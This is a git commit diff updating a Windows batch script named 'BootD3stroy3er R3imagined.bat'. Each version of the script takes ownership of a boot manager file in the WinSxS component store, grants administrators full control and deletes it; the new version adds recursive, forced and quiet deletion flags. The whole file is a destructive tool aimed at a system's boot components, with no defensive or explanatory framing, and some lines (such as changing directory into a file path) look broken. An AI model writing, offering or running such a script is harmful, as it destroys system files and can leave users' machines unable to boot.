2deb8c911d99fa64aa138fad6d3f64237d38e292
hunterhudspeth2030-arch <hunterhudspeth2030@gmail.com>
2025-11-24 18:42:56 -0700

    Update BootD3stroy3er R3imagined.bat

--- BootD3stroy3er R3imagined.bat
+++ BootD3stroy3er R3imagined.bat
@@ -1,7 +1,9 @@
 @echo off
-takeown /f "C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr"
-icacls "C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr" /grant administrators:F /t
-del "C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr"
+takeown /f "C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr" /r /d y
+icacls C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr /grant administrators:F /t
+cd  C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr
+@echo off 
+del /F /S /Q "C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr"
 
 
 
